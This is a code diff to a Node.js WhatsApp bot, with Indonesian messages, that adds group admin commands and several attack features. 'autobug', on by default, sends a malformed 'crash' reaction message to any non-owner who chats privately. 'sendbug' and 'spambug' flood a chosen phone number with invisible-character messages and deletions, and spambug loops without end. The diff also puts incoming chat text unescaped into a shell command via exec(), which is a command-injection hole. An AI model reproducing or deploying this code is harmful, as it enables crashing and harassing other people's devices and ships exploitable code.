@@ -1,11 +1,12 @@
-const { proto, getContentType } = require('@adiwajshing/baileys')
-const { getGroupAdmins } = require('./storage/functions.js')
+const { baileys, getContentType } = require('@adiwajshing/baileys')
+const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
+const { exec } = require('child_process')
 const fs = require('fs')
+autobug = true
 
 module.exports = async (semar, denz, msg) => {
 try {
 if (msg.key && msg.key.remoteJid === 'status@broadcast') return
-const pushname = msg.pushName || 'Nama Tidak Terdeteksi'
 const type = getContentType(msg.message)
 const content = JSON.stringify(msg.message)
 const from = msg.key.remoteJid
@@ -19,17 +20,20 @@ const dn = args.join(' ')
 const isGroup = from.endsWith('@g.us')
 const botNumber = semar.user.id.split(':')[0]
 const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
+const senderNumber = sender.split('@')[0]
+const pushname = msg.pushName || `${senderNumber}`
 const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
 const groupName = isGroup ? groupMetadata.subject : ''
 const groupId = isGroup ? groupMetadata.id : ''
 const groupMembers = isGroup ? groupMetadata.participants : ''
 const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
-const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
-const isGroupAdmins = groupAdmins.includes(sender)
-const senderNumber = sender.split('@')[0]
+const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
+const isGroupAdmins = groupAdmins.includes(sender) || false
 const isSaya = botNumber.includes(senderNumber)
 const isOwner = nomorOwner.includes(senderNumber) || isSaya
 const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
+const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
+const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
 
 const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
 const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
@@ -43,27 +47,136 @@ const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], opti
 const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
 semar.sendMessage(id, listMessage, options)}
 
-const sendRacMessage = (id, text1 = {}) => {
-const reactionMessage = {react: {text: text1,key: msg.key}}
-semar.sendMessage(id, reactionMessage)}
+if (body.startsWith(`‎`)) { 
+semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
+
+if (!isOwner && autobug && !isGroup) { 
+semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
+
+if (!isGroup && body && !msg.key.fromMe) {
+exec(`termux-toast -c cyan "CHAT : ${body}\nFROM : ${pushname}\nNUMBER : ${senderNumber}"`, (error, stdout, stderr) => { console.log(stdout)})}
 
 switch (command) {
-case 'p1':
-sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}p1`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: 'id2', buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: 'id3', buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
+case 'cek': case 'test': case 'status':
+exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
 break
 
-case 'p2':
+case 'groupsetting':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
+if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `groupsetting open`, buttonText: { displayText: "OPEN" }, type: 1},{ buttonId: `groupsetting close`, buttonText: { displayText: "CLOSE" }, type: 1}], {quoted:msg})
+if (dn === 'open'){ await semar.groupSettingUpdate(from, 'not_announcement')
+} else if (dn === 'close'){ await semar.groupSettingUpdate(from, 'announcement')} else { reply('Error')}
+break
+
+case 'add':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
+if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
+add = msg.message.extendedTextMessage.contextInfo.participant
+await semar.groupParticipantsUpdate(from, [add], "add")
+break
+
+case 'kick':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
+if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
+remove = msg.message.extendedTextMessage.contextInfo.participant
+await semar.groupParticipantsUpdate(from, [remove], "remove")
+break
+
+case 'promote':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
+if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
+promote = msg.message.extendedTextMessage.contextInfo.participant
+await semar.groupParticipantsUpdate(from, [promote], "promote")
+reply('Done!')
+break
+
+case 'demote':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
+if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
+demote = msg.message.extendedTextMessage.contextInfo.participant
+await semar.groupParticipantsUpdate(from, [demote], "demote")
+reply('Done!')
+break
+
+case 'sendbug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (args[0].startsWith('6285727091924')) return reply('Tidak bisa mengirim bug ke nomor developer!')
+if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
+nd = dn.split("|")
+if (!nd) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (Number(nd[1]) >= 5000) return reply('Jumlah terlalu banyak!')
+if (!Number(nd[1])) return reply('Jumlah harus berupa angka!')
+for (let i = 0; i < nd[1]; i++){
+await sleep(5000)
+let bug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
+await sleep(5000)
+semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: bug.key })}
+reply(`Sukses send bug ke nomor ${nd[0]}`)
+break	
+
+case 'spambug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('6285727091924')) return reply('Tidak bisa mengirim bug ke nomor developer!')
+if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
+async function logEvery2Seconds(i) { 
+await sleep(1000)
+let spam = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" })
+await sleep(1000)
+semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: spam.key })
+logEvery2Seconds(++i)}
+logEvery2Seconds(1)
+reply(`Sukses spam bug ke nomor ${dn}`)
+break	
+
+case 'autobug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
+if (dn === 'on'){ autobug = true
+reply('Sukses')
+} else if (dn === 'off'){ autobug = false
+reply('Sukses')} else { reply('Error')}
+break
+
+case '01':
+sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
+break
+
+case '02':
 sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
 break
 
-case 'p3':
+case '03':
 sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
 break
 
-case 'react':
-sendRacMessage(from, `${dn}`)
+case 'restart':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
 break
 
+case 'shutdown':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
+break
 default:
 }} catch (e) {
-console.log(e)}}
+console.log(e)
+exec(`termux-toast -c red ${e}`, (error, stdout, stderr) => { console.log(stdout)})}}
